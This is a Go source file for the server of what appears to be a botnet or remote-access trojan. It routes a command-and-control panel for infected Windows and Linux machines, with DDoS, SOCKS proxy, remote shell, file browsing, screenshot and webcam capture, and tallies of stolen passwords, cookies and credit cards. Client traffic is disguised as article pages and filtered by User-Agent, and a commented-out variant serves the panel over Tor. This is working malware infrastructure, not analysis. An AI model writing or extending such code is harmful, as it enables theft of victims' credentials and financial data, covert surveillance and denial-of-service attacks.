// Include Bandwidth calculations for communications

package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"

	"github.com/gorilla/mux"
)

//func redirect(w http.ResponseWriter, req *http.Request) {
//	target := "https://" + req.Host + req.URL.Path
//	if len(req.URL.RawQuery) > 0 {
//		target += "?" + req.URL.RawQuery
//	}
//	http.Redirect(w, req, target,
//		http.StatusTemporaryRedirect)
//}

//func GoServerWithTOR(){
//	Log.Println("Starting MUX Routing...")
//	router := mux.NewRouter()
//	//DDoSHandler
//	//Pages
//	router.HandleFunc("/", dashboardHandle)
//	router.HandleFunc("/clients/windows", clientsWindowsHandle)
//	router.HandleFunc("/manage/windows", manageWindowsHandle)
//	router.HandleFunc("/ddos", DDoSHandler)
//	router.HandleFunc("/socks", socksPageHandler)
//	router.HandleFunc("/tasks", tasksHandle)
//	//newTaskHandle
//	router.HandleFunc("/settings", settingsHandle)
//	//Login Pages
//	router.HandleFunc("/login", loginHandler)
//	router.HandleFunc("/logout", logoutHandler)
//	//Functions
//	router.HandleFunc("/issue/windows", issueCommand)
//	router.HandleFunc("/save/client/notes", saveClientNotes)
//	router.HandleFunc("/delete/admin", deleteAdmin)
//	router.HandleFunc("/delete/client/windows", deleteClient)
//	router.HandleFunc("/delete/command", deleteCommand)
//	router.HandleFunc("/tasks/windows/new", newTaskHandle)
//	router.HandleFunc("/delete/task/windows", deleteTask)
//	router.HandleFunc("/delete/file/windows", deleteFile)
//	router.HandleFunc("/save/settings", saveSettingsHandler)
//	router.HandleFunc("/save/daemon", saveDaemonSettingsHandler)
//	router.HandleFunc("/add/admin", addAdminHandler)
//	router.HandleFunc("/clear/clients", truncateClients)
//	router.HandleFunc("/clear/commands", truncateCommands)
//	router.HandleFunc("/save/notes", saveAdminNotes)
//	router.HandleFunc("/live", Live)
//	//Client Stuff
//	router.HandleFunc("/ping", ping)
//	//Need to make this more dynamic, Needs to be more random and have more variables similer to normal webtrafic
//
//	//	router.HandleFunc("/test/test.{suffix:(?:php|asp|html)}", test) //http://127.0.0.1/test/test.{...}
//	//	router.HandleFunc("/test/{authority:(?:post|user|listing|download|page|channel|forumdisplay)}.{suffix:(?:php|asp|html)}", test)//http://127.0.0.1/test/.{...}.{...}
//
//	//Idea for cover
//	// C2.com/{RandomWordA}/{RandomWordB}/{RandomWordC/{RandomNEWWord}.{RandomSuffix}
//
//	router.HandleFunc("/articles/{random}/{random}/new.html", newClient).Headers("User-Agent", UserAgent)          //New Client Connection
//	router.HandleFunc("/articles/{random}/{random}/read.html", readClient).Headers("User-Agent", UserAgent)        //Check Client Commands
//	router.HandleFunc("/articles/{random}/{random}/edit.html", statusClient).Headers("User-Agent", UserAgent)      //Tell C2 if Client finished Command
//	router.HandleFunc("/articles/{random}/{random}/images.html", imagesClient).Headers("User-Agent", UserAgent)    //Update Clients Screenshot or Webcam
//	router.HandleFunc("/articles/{random}/{random}/account.html", settingsClient).Headers("User-Agent", UserAgent) //Give client its last Settings
//	router.HandleFunc("/articles/{random}/{random}/upload.html", filesClient).Headers("User-Agent", UserAgent)     //Upload files
//	//Test
//	router.HandleFunc("/test", FormTest)
//	router.HandleFunc("/ip", ip)
//	//Backend stuff
//	router.HandleFunc("/favicon.ico", faviconHandle)
//
//	router.NotFoundHandler = http.HandlerFunc(notFound)
//	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
//	router.PathPrefix("/files/").Handler(http.StripPrefix("/files/", http.FileServer(http.Dir("clients"))))
//
//
//	fmt.Println("Starting and registering onion service, please wait a couple of minutes...")
//	d, _ := ioutil.TempDir("", "data-dir")
//	conf := &tor.StartConf{
//		ProcessCreator: embedded.NewCreator(),
//		TorrcFile:      "torrc-defaults",
//		DataDir:        d,
//	}
//	t, err := tor.Start(nil, conf)
//	if err != nil {
//		log.Panicf("Unable to start Tor: %v", err)
//	}
//	defer t.Close()
//	listenCtx, listenCancel := context.WithTimeout(context.Background(), 3*time.Minute)
//	defer listenCancel()
//	onion, err := t.Listen(listenCtx, &tor.ListenConf{Version3: true, RemotePorts: []int{80}})
//	if err != nil {
//		log.Printf("Unable to create onion service: %v", err)
//		return
//	}
//	defer onion.Close()
//	fmt.Printf("Open Tor browser and navigate to http://%v.onion\n", onion.ID)
//	fmt.Println("Press enter to exit")
//	errCh := make(chan error, 1)
//	go func() { errCh <- http.Serve(onion, router) }()
//	go func() {
//		fmt.Scanln()
//		errCh <- nil
//	}()
//	if err = <-errCh; err != nil {
//		log.Printf("Failed serving: %v", err)
//	}
//}
func MuxRouter() *mux.Router {
	Log.Println("Starting MUX Routing...")
	router := mux.NewRouter()
	//DDoSHandler
	//Pages
	router.HandleFunc("/", dashboardHandle)
	router.HandleFunc("/clients/windows", clientsWindowsHandle)
	router.HandleFunc("/manage/windows", manageWindowsHandle)
	// linux clients
	router.HandleFunc("/clients/linux", clientsLinuxHandle)
	// router.HandleFunc("/manage/linux", manageLinuxHandle)
	router.HandleFunc("/ddos", DDoSHandler)
	router.HandleFunc("/socks", socksPageHandler)
	router.HandleFunc("/tasks", tasksHandle)
	//newTaskHandle
	router.HandleFunc("/settings", settingsHandle)
	//Login Pages
	router.HandleFunc("/login", loginHandler)
	router.HandleFunc("/logout", logoutHandler)
	//Functions
	router.HandleFunc("/issue/windows", issueCommand)
	router.HandleFunc("/issue/windows/toggle", toggleClientFeature)
	router.HandleFunc("/save/client/notes", saveClientNotes)
	router.HandleFunc("/delete/admin", deleteAdmin)
	router.HandleFunc("/delete/client/windows", deleteClient)
	router.HandleFunc("/delete/command", deleteCommand)
	router.HandleFunc("/tasks/windows/new", newTaskHandle)
	router.HandleFunc("/delete/task/windows", deleteTask)
	router.HandleFunc("/delete/file/windows", deleteFile)
	router.HandleFunc("/save/settings", saveSettingsHandler)
	router.HandleFunc("/save/daemon", saveDaemonSettingsHandler)
	router.HandleFunc("/add/admin", addAdminHandler)
	router.HandleFunc("/clear/clients", truncateClients)
	router.HandleFunc("/clear/commands", truncateCommands)
	router.HandleFunc("/save/notes", saveAdminNotes)
	router.HandleFunc("/live", Live)
	//Client Stuff
	router.HandleFunc("/ping", ping)
	//Need to make this more dynamic, Needs to be more random and have more variables similer to normal webtrafic

	//	router.HandleFunc("/test/test.{suffix:(?:php|asp|html)}", test) //http://127.0.0.1/test/test.{...}
	//	router.HandleFunc("/test/{authority:(?:post|user|listing|download|page|channel|forumdisplay)}.{suffix:(?:php|asp|html)}", test)//http://127.0.0.1/test/.{...}.{...}

	//Idea for cover
	// C2.com/{RandomWordA}/{RandomWordB}/{RandomWordC/{RandomNEWWord}.{RandomSuffix}

	router.HandleFunc("/articles/{random}/{random}/new.html", newClient).Headers("User-Agent", UserAgent)             //New Client Connection
	router.HandleFunc("/articles/{random}/{random}/read.html", readClient).Headers("User-Agent", UserAgent)           //Check Client Commands
	router.HandleFunc("/articles/{random}/{random}/edit.html", statusClient).Headers("User-Agent", UserAgent)         //Tell C2 if Client finished Command
	router.HandleFunc("/articles/{random}/{random}/images.html", imagesClient).Headers("User-Agent", UserAgent)       //Update Clients Screenshot or Webcam
	router.HandleFunc("/articles/{random}/{random}/account.html", settingsClient).Headers("User-Agent", UserAgent)    //Give client its last Settings
	router.HandleFunc("/articles/{random}/{random}/upload.html", filesClient).Headers("User-Agent", UserAgent)        //Upload files
	router.HandleFunc("/articles/{random}/{random}/member.html", updateClient).Headers("User-Agent", UserAgent)       //Update C2 client info
	router.HandleFunc("/articles/{random}/{random}/thread.html", passCounts).Headers("User-Agent", UserAgent)         //Update the Count of Passwords, Cookies and Credit Cards stolen from Client
	router.HandleFunc("/articles/{random}/{random}/reply.html", RemoteShellResponse).Headers("User-Agent", UserAgent) //Response from remote shell
	router.HandleFunc("/articles/{random}/{random}/shop.html", fileBrowser).Headers("User-Agent", UserAgent)          //File Browser stuff
	//Test
	router.HandleFunc("/test", FormTest)
	router.HandleFunc("/ip", ip)
	//Backend stuff
	router.HandleFunc("/favicon.ico", faviconHandle)

	router.NotFoundHandler = http.HandlerFunc(notFound)
	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	router.PathPrefix("/files/").Handler(http.StripPrefix("/files/", http.FileServer(http.Dir("clients"))))
	return router
}

func GoServerWithFrontend() {
	//go http.ListenAndServe("localhost:"+serverPort, http.HandlerFunc(redirect))

	cfg := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}

	Server := &http.Server{
		Handler:      MuxRouter(),
		Addr:         ":" + serverPort,
		TLSConfig:    cfg,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
	}

	fmt.Println("Server Is Starting...")
	if ssl {
		if Err := Server.ListenAndServeTLS(cert, key); Err != nil {
			Log.Println("TLS Server Error: " + Err.Error())
		}
	} else {
		Log.Fatal(Server.ListenAndServe())
	}
	Log.Println("Server Online")
}

// func GoServerNoFrontend() {
//	Log.Println("Starting MUX Routing...")
//	router := mux.NewRouter()
//	//Client Stuff
//	router.HandleFunc("/ping", ping)
//	router.HandleFunc("/articles/{random}/{random}/new.html", newClient).Headers("User-Agent", UserAgent)       //New Client Connection
//	router.HandleFunc("/articles/{random}/{random}/read.html", readClient).Headers("User-Agent", UserAgent)     //Check Client Commands
//	router.HandleFunc("/articles/{random}/{random}/edit.html", statusClient).Headers("User-Agent", UserAgent)   //Tell C2 if Client finished Command
//	router.HandleFunc("/articles/{random}/{random}/images.html", imagesClient).Headers("User-Agent", UserAgent) //Update Clients Screenshot or Webcam
//	//Test
//	router.HandleFunc("/test", FormTest)
//	router.HandleFunc("/ip", ip)
//	//Backend stuff
//	router.NotFoundHandler = http.HandlerFunc(notFound)
//
//	Server := &http.Server{
//		Handler:      router,
//		Addr:         ":" + serverPort,
//		WriteTimeout: time.Second * 15,
//		ReadTimeout:  time.Second * 15,
//		IdleTimeout:  time.Second * 60,
//	}
//
//	if ssl {
//		if Err := Server.ListenAndServeTLS(cert, key); Err != nil {
//			Log.Println("TLS Server Error: " + Err.Error())
//		}
//	} else {
//		Log.Fatal(Server.ListenAndServe())
//	}
//	Log.Println("Server Online")
//}
